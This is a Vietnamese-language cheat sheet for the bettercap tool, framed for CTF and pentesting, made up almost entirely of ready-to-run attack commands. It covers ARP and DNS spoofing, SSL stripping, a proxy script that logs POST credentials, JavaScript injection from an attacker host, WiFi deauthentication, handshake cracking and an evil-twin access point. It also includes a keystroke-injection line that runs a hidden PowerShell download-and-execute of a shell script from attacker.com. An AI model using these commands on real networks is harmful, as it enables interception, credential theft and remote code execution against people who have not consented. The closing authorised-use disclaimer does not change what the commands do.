## 📦 Cài đặt

```bash
# Ubuntu / Debian
sudo apt install bettercap

# Go install (version mới nhất)
go install github.com/bettercap/bettercap@latest

# Build from source
git clone https://github.com/bettercap/bettercap
cd bettercap && make build

# Kiểm tra version
bettercap -version
```

---

## 🚀 Khởi động

```bash
# Chạy cơ bản
sudo bettercap

# Chỉ định interface
sudo bettercap -iface eth0
sudo bettercap -iface tun0          # HTB/THM VPN interface

# Chạy với caplet (script)
sudo bettercap -caplet http-ui.cap
sudo bettercap -caplet /path/to/script.cap

# Chạy lệnh trực tiếp không vào interactive
sudo bettercap -iface eth0 -eval "net.probe on; net.recon on"

# Chế độ không có màu (dùng khi pipe/log)
sudo bettercap -no-colors

# Ghi log ra file
sudo bettercap -log /tmp/bettercap.log

# Debug mode
sudo bettercap -debug
```

---

## 🖥️ Interactive Console

```bash
# Khi vào console, dùng Tab để autocomplete
help                          # xem tất cả modules
help <module>                 # xem help của module cụ thể
active                        # xem các modules đang chạy
quit / exit                   # thoát
```

---

## 🌐 Net Discovery (Quét mạng)

```bash
# Bật network recon (passive — lắng nghe ARP)
net.recon on

# Bật network probe (active — gửi ARP requests)
net.probe on

# Xem danh sách hosts đã phát hiện
net.show

# Xem hosts với filter
net.show 192.168.1.0/24

# Tắt recon
net.recon off
net.probe off
```

### Thiết lập subnet tùy chỉnh

```
set net.probe.throttle 10        # ms giữa các probe (default: 10)
set net.recon.period 1000        # ms giữa các lần recon (default: 1000)
```

---

## 🎭 ARP Spoofing (MITM cổ điển)

### Cấu hình cơ bản

```bash
# Bật IP forwarding trước (quan trọng!)
echo 1 > /proc/sys/net/ipv4/ip_forward
# hoặc trong bettercap:
set arp.spoof.fullduplex true   # tự động handle forwarding

# MITM toàn bộ mạng
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# MITM 1 target cụ thể
set arp.spoof.targets 192.168.1.100
arp.spoof on

# MITM nhiều targets
set arp.spoof.targets 192.168.1.100,192.168.1.101,192.168.1.102
arp.spoof on
```

### Full Duplex (IppSec hay dùng)

```bash
# Spoof cả target VÀ gateway (bắt được cả 2 chiều)
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.100
arp.spoof on
```

### Các tùy chọn ARP

```
set arp.spoof.targets <IPs>       # targets (comma-separated, CIDR ok)
set arp.spoof.whitelist <IPs>     # loại trừ các IP này
set arp.spoof.fullduplex true     # spoof cả gateway (full MITM)
set arp.spoof.internal true       # spoof traffic giữa các LAN hosts
```

---

## 🔀 DNS Spoofing

```bash
# Redirect tất cả DNS về IP của mình
set dns.spoof.all true
set dns.spoof.address 192.168.1.50   # IP máy attacker

# Spoof domain cụ thể
set dns.spoof.domains example.com,*.evil.com
set dns.spoof.address 192.168.1.50

# Kết hợp với ARP spoof
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.100
set dns.spoof.all true
set dns.spoof.address 192.168.1.50
arp.spoof on
dns.spoof on
```

---

## 🌍 HTTP Proxy (Intercept & Modify)

### Bật HTTP proxy

```bash
http.proxy on

# Thiết lập port
set http.proxy.port 8080         # default: 8080

# Redirect traffic về proxy (dùng kết hợp arp.spoof)
set http.proxy.redirect true
```

### HTTP Proxy với Javascript Injection

```bash
# Inject JS vào tất cả HTTP responses
set http.proxy.injectjs "alert('PWNED')"

# Inject từ file
set http.proxy.injectjs /path/to/payload.js

# Inject từ URL
set http.proxy.injectjs https://attacker.com/hook.js
```

### HTTP Proxy Script (powerful — dùng trong CTF)

```bash
set http.proxy.script /path/to/proxy.js
http.proxy on
```

Ví dụ `proxy.js` — log credentials:

```javascript
function onRequest(req, res) {
    // Log POST body (passwords, tokens)
    if(req.Method == "POST") {
        log(req.Body)
    }
}

function onResponse(req, res) {
    // Modify response
    if(res.ContentType.includes("text/html")) {
        res.Body = res.Body.replace("</body>", "<script>alert(1)</script></body>")
    }
}
```

---

## 🔒 HTTPS / SSL Strip (HSTS Bypass)

```bash
# HTTPS proxy (với SSL stripping)
https.proxy on
set https.proxy.port 8083

# SSL strip — hạ cấp HTTPS → HTTP
set https.proxy.sslstrip true
https.proxy on

# Kết hợp full MITM + SSL strip
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.100
set https.proxy.sslstrip true
arp.spoof on
https.proxy on
```

---

## 📡 Packet Sniffer

```bash
# Bật sniffer
net.sniff on

# Xem packets realtime
set net.sniff.verbose true

# Filter packets (BPF syntax)
set net.sniff.filter "port 80 or port 21 or port 23"

# Ghi vào pcap
set net.sniff.output /tmp/capture.pcap
net.sniff on

# Local sniff (bắt traffic của chính máy mình)
set net.sniff.local true
net.sniff on
```

---

## 📶 WiFi (802.11)

### Recon WiFi

```bash
# Cần wireless interface hỗ trợ monitor mode
sudo bettercap -iface wlan0

# Bật WiFi recon
wifi.recon on

# Xem danh sách APs
wifi.show

# Recon 1 channel cụ thể
set wifi.recon.channel 6
wifi.recon on
```

### Deauth Attack

```bash
# Deauth tất cả clients của 1 AP
wifi.deauth AA:BB:CC:DD:EE:FF

# Deauth client cụ thể
wifi.deauth 11:22:33:44:55:66

# Deauth tất cả (broadcast)
wifi.deauth ff:ff:ff:ff:ff:ff
```

### WPA Handshake Capture

```bash
# Recon để tìm target AP
wifi.recon on
wifi.show

# Deauth để force re-auth (capture handshake)
wifi.deauth <BSSID>

# Ghi handshake ra file
set wifi.handshakes.file /tmp/handshakes.pcap
wifi.recon on
```

### Evil Twin / Rogue AP

```bash
# Tạo rogue AP
set wifi.ap.ssid "Free WiFi"
set wifi.ap.bssid aa:bb:cc:dd:ee:ff
set wifi.ap.channel 6
set wifi.ap.encryption false      # Open network
wifi.ap on
```

---

## 🖧 BLE (Bluetooth Low Energy)

```bash
# Recon BLE devices
ble.recon on

# Xem devices
ble.show

# Enum services của device
ble.enum <MAC>

# Ghi dữ liệu vào characteristic
ble.write <MAC> <UUID> <HEX_DATA>
```

---

## 📟 HID (Keystroke Injection)

```bash
# Inject keystrokes qua BLE HID
hid.inject <MAC> <payload>

# Ví dụ: mở terminal và chạy reverse shell
hid.inject AA:BB:CC:DD:EE:FF "cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
```

---

## 🧰 Caplets (Scripts tự động hóa)

### Chạy caplet

```bash
sudo bettercap -caplet name_of_caplet
```

### Các built-in caplets hữu ích

```bash
# Xem tất cả caplets có sẵn
caplets.show

# Update caplets
caplets.update

# HTTP UI (Web dashboard)
sudo bettercap -caplet http-ui

# Minhimum MITM
sudo bettercap -caplet mitm

# Pita — all-in-one MITM + sniff
sudo bettercap -caplet pita
```

### Viết caplet tùy chỉnh (`.cap` file)

```bash
# full-mitm.cap — IppSec style
set $ {by}{fw}{env.iface.name}{reset} » {bold}

# Discovery
net.probe on
net.recon on

# MITM
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.100
arp.spoof on

# Sniff
set net.sniff.verbose false
set net.sniff.output /tmp/mitm.pcap
net.sniff on

# Proxy
set http.proxy.sslstrip true
http.proxy on
```

```bash
# Chạy caplet
sudo bettercap -iface eth0 -caplet full-mitm.cap
```

---

## 🕵️ Kỹ thuật CTF & Pentest thực tế

### Pattern 1: Quick MITM + credential harvest

```bash
sudo bettercap -iface eth0 -eval "
  set arp.spoof.targets 10.10.10.0/24;
  set arp.spoof.fullduplex true;
  set net.sniff.output /tmp/creds.pcap;
  arp.spoof on;
  net.sniff on
"
```

### Pattern 2: Phishing qua DNS spoof (CTF web challenge)

```bash
# Terminal 1: bettercap MITM + DNS spoof
sudo bettercap -iface eth0 -eval "
  set arp.spoof.fullduplex true;
  set arp.spoof.targets 10.10.10.50;
  set dns.spoof.all true;
  set dns.spoof.address 10.10.14.5;
  arp.spoof on;
  dns.spoof on
"

# Terminal 2: Python fake server để capture request
sudo python3 -m http.server 80
# hoặc
sudo responder -I eth0
```

### Pattern 3: Capture NTLMv2 hash (Windows AD CTF)

```bash
# Kết hợp bettercap + responder
sudo bettercap -iface eth0 -eval "
  set arp.spoof.targets 10.10.10.100;
  set arp.spoof.fullduplex true;
  set dns.spoof.all true;
  set dns.spoof.address 10.10.14.5;
  arp.spoof on;
  dns.spoof on
"

# Responder bắt NTLM
sudo responder -I eth0 -wrf
```

### Pattern 4: Inject payload vào HTTP (XSS / BeEF hook)

```bash
sudo bettercap -iface eth0 -eval "
  set arp.spoof.targets 192.168.1.100;
  set arp.spoof.fullduplex true;
  set http.proxy.injectjs 'http://192.168.1.50:3000/hook.js';
  arp.spoof on;
  http.proxy on
"
```

### Pattern 5: WiFi password cracking workflow

```bash
# Step 1: Capture handshake
sudo bettercap -iface wlan0 -eval "
  set wifi.recon.channel 6;
  set wifi.handshakes.file /tmp/hs.pcap;
  wifi.recon on
"
# Sau đó: wifi.deauth <BSSID>

# Step 2: Crack với hashcat
hcxpcapngtool -o hash.hc22000 /tmp/hs.pcap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

---

## 📊 Events & Logging

```bash
# Xem events realtime
events.stream on
events.stream off

# Xem event history
events.show
events.show 50                   # 50 events gần nhất

# Clear events
events.clear

# Ignore event types (giảm noise)
set events.stream.ignore endpoint.new,wifi.client.probe
```

---

## 🔧 API REST (Remote Control)

```bash
# Bật API server
set api.rest.address 0.0.0.0
set api.rest.port 8083
set api.rest.username admin
set api.rest.password password
api.rest on

# Dùng curl để control từ xa
curl -k https://localhost:8083/api/session \
  -u admin:password

# Chạy lệnh qua API
curl -k https://localhost:8083/api/session \
  -u admin:password \
  -H "Content-Type: application/json" \
  -d '{"cmd": "net.show"}'
```

---

## 🌐 Web UI

```bash
# Cài web UI
sudo bettercap -eval "caplets.update; ui.update; q"

# Chạy với web UI
sudo bettercap -caplet http-ui
# Truy cập: http://localhost:80
# Default creds: user / password
```

---

## ⚙️ Các biến môi trường hữu ích

```bash
# Xem tất cả biến đang set
env

# Xem biến cụ thể
get arp.spoof.targets

# Set biến
set net.probe.throttle 10

# Xem interface info
get iface
get iface.name
get iface.ipv4
get iface.mac
```

---

## 🆚 Bettercap vs Ettercap

|Tính năng|Bettercap|Ettercap|
|---|---|---|
|Active development|✅|❌ stale|
|WiFi attacks|✅|❌|
|BLE attacks|✅|❌|
|Scripting (caplets)|✅ mạnh|hạn chế|
|Web UI|✅|❌|
|IPv6|✅|hạn chế|
|CTF usage|✅ phổ biến|ít dùng|
|IppSec dùng|✅|❌|

---

## 🧩 Kết hợp với các tool khác

```bash
# Bettercap + Wireshark (live capture)
sudo bettercap -eval "net.sniff on" &
wireshark -i eth0 -k

# Bettercap + Responder (NTLM capture)
sudo bettercap -iface eth0 [dns.spoof on] &
sudo responder -I eth0

# Bettercap + mitmproxy (advanced proxy)
# Set upstream proxy
set http.proxy.upstream.proxy http://127.0.0.1:8081
http.proxy on
# Rồi chạy mitmproxy trên port 8081

# Bettercap + BeEF
set http.proxy.injectjs "http://localhost:3000/hook.js"
http.proxy on

# Bettercap + SSLsplit
https.proxy on
# SSLsplit handle cert forgery
```

---

## ⚠️ Troubleshooting

```bash
# Lỗi: "no interface"
sudo bettercap -iface $(ip route | grep default | awk '{print $5}')

# Lỗi: ARP spoof không hoạt động
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Lỗi: không bắt được HTTPS
# → cần import cert của bettercap vào browser target
# cert nằm ở: ~/.bettercap-ca.cert.pem

# Lỗi: wifi.recon không thấy AP
# → cần interface hỗ trợ monitor mode
sudo iw dev wlan0 set type monitor
# hoặc dùng airmon-ng
sudo airmon-ng start wlan0

# Reset về trạng thái ban đầu (sau khi MITM)
arp.spoof off
dns.spoof off
net.sniff off
```

---

## 📁 File & Paths quan trọng

```
~/.bettercap-ca.cert.pem     # CA certificate (để import vào browser)
~/.bettercap-ca.key.pem      # CA private key
/usr/share/bettercap/caplets/  # Built-in caplets
```

---

## 📚 Tài liệu tham khảo

- **Docs chính thức**: [https://www.bettercap.org/docs/](https://www.bettercap.org/docs/)
- **GitHub**: [https://github.com/bettercap/bettercap](https://github.com/bettercap/bettercap)
- **Caplets repo**: [https://github.com/bettercap/caplets](https://github.com/bettercap/caplets)
- **IppSec YouTube** — xem các HTB box liên quan đến MITM / AD network
- **0xdf blog** — [https://0xdf.gitlab.io](https://0xdf.gitlab.io/) — nhiều writeup dùng bettercap

---

_Cheat sheet tổng hợp từ docs chính thức bettercap v2.x, IppSec writeups, và kinh nghiệm CTF/pentest thực tế. Chỉ sử dụng trên mạng bạn được phép kiểm tra._